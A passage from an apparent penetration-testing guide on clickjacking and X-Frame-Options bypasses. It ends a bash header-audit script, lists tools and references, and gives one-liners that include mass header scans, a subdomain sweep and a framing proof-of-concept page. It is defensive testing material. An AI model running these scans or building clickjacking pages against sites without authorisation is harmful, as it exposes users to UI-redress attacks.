  echo "$BODY" | grep -oiE "(if\s*\(.*top.*self|top\.location\s*=|window\.frameElement)" | head -5 | sed 's/^/    /'
else
  echo "  ✅ No JS frame-busting detected"
fi
echo ""

# 7. Endpoint consistency check
echo "[7] Endpoint Consistency"
echo "========================"
CHECK_PATHS=(/login /register /settings /profile /api /admin /oauth/authorize /embed /widget /404-test-nonexistent)
for path in "${CHECK_PATHS[@]}"; do
  url="${TARGET%/}${path}"
  resp=$(curl -sI "$url" 2>/dev/null)
  status=$(echo "$resp" | head -1 | awk '{print $2}')
  path_xfo=$(echo "$resp" | grep -i "x-frame-options" | tr -d '\r\n' | xargs)
  if [ "$status" != "000" ] && [ -n "$status" ]; then
    if [ -z "$path_xfo" ]; then
      echo "  ⚠️  $path (HTTP $status) — NO XFO"
    else
      echo "  ✅ $path (HTTP $status) — $path_xfo"
    fi
  fi
done
echo ""

# 8. Cookie SameSite check
echo "[8] Cookie SameSite Analysis"
echo "============================"
curl -sI "$TARGET" 2>/dev/null | grep -i "set-cookie" | while read cookie; do
  name=$(echo "$cookie" | grep -oE '[^:]+=[^;]+' | head -1 | cut -d= -f1 | xargs)
  ss=$(echo "$cookie" | grep -oi "samesite=[a-z]*" | head -1)
  echo "  Cookie: $name | ${ss:-SameSite=Not Set (defaults to Lax)}"
done
echo ""

echo "=============================================="
echo "Audit Complete"
echo "=============================================="
```

```bash [Usage]
chmod +x full_xfo_bypass_audit.sh
./full_xfo_bypass_audit.sh "https://target.com"
./full_xfo_bypass_audit.sh "https://target.com/settings"
```

---

## Tools & Resources

### Primary Tools

::field-group
  ::field{name="Burp Suite Clickbandit" type="string"}
  Automated clickjacking PoC generator built into Burp Suite Professional. Navigates target in embedded browser and generates exploit HTML.
  `Burp > Menu > Burp Clickbandit`
  ::

  ::field{name="Nuclei" type="string"}
  Template-based scanner with clickjacking and XFO detection templates.
  `nuclei -tags clickjacking -u target.com`
  ::

  ::field{name="SecurityHeaders.com" type="string"}
  Online tool that grades a site's security headers including XFO and CSP.
  `https://securityheaders.com/?q=target.com`
  ::

  ::field{name="Mozilla Observatory" type="string"}
  Free web security scanner from Mozilla that checks XFO, CSP, and other headers.
  `https://observatory.mozilla.org`
  ::

  ::field{name="subfinder + subjack" type="string"}
  Subdomain discovery and takeover detection for exploiting SAMEORIGIN and CSP wildcard bypasses.
  `https://github.com/projectdiscovery/subfinder`
  ::

  ::field{name="httpx" type="string"}
  Fast HTTP toolkit for mass header analysis and response probing.
  `https://github.com/projectdiscovery/httpx`
  ::

  ::field{name="clickjacking-tool" type="string"}
  Automated clickjacking vulnerability tester.
  `https://github.com/coffinxp/clickjacking-tool`
  ::

  ::field{name="CSP Evaluator (Google)" type="string"}
  Online tool to analyze CSP headers for weaknesses including frame-ancestors.
  `https://csp-evaluator.withgoogle.com`
  ::
::

### References

::field-group
  ::field{name="MDN X-Frame-Options" type="string"}
  `https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options`
  ::

  ::field{name="RFC 7034 — X-Frame-Options" type="string"}
  `https://www.rfc-editor.org/rfc/rfc7034`
  ::

  ::field{name="OWASP Clickjacking Defense" type="string"}
  `https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html`
  ::

  ::field{name="PortSwigger Clickjacking" type="string"}
  `https://portswigger.net/web-security/clickjacking`
  ::

  ::field{name="HackTricks Clickjacking" type="string"}
  `https://book.hacktricks.wiki/en/pentesting-web/clickjacking.html`
  ::

  ::field{name="CSP frame-ancestors Spec" type="string"}
  `https://www.w3.org/TR/CSP3/#directive-frame-ancestors`
  ::

  ::field{name="PayloadsAllTheThings" type="string"}
  `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Clickjacking`
  ::

  ::field{name="CWE-1021" type="string"}
  Improper Restriction of Rendered UI Layers or Frames.
  `https://cwe.mitre.org/data/definitions/1021.html`
  ::
::

### Quick Reference Commands

```bash [One-Liners]
# Instant XFO check
curl -sI https://target.com | grep -i "x-frame" || echo "NO XFO — FRAMEABLE"

# Check XFO + CSP together
curl -sI https://target.com | grep -iE "x-frame|frame-ancestors" || echo "NO FRAMING PROTECTION"

# Mass scan URLs for missing XFO
cat urls.txt | while read u; do curl -sI "$u" 2>/dev/null | grep -qi "x-frame-options" || echo "$u"; done > no_xfo.txt

# Quick PoC generation and serving
echo '<h2>XFO Bypass PoC</h2><iframe src="https://target.com" width="100%" height="600" style="border:2px solid red;"></iframe>' > xfo_poc.html && python3 -m http.server 8080

# Check all subdomains for XFO
subfinder -d target.com -silent | httpx -silent | while read u; do echo -n "$u: "; curl -sI "$u" 2>/dev/null | grep -i "x-frame-options" || echo "MISSING"; done

# SecurityHeaders.com CLI check
curl -s "https://securityheaders.com/?q=https://target.com&followRedirects=on" | grep -i "x-frame"

# nuclei quick check
echo "https://target.com" | nuclei -tags clickjacking -silent
```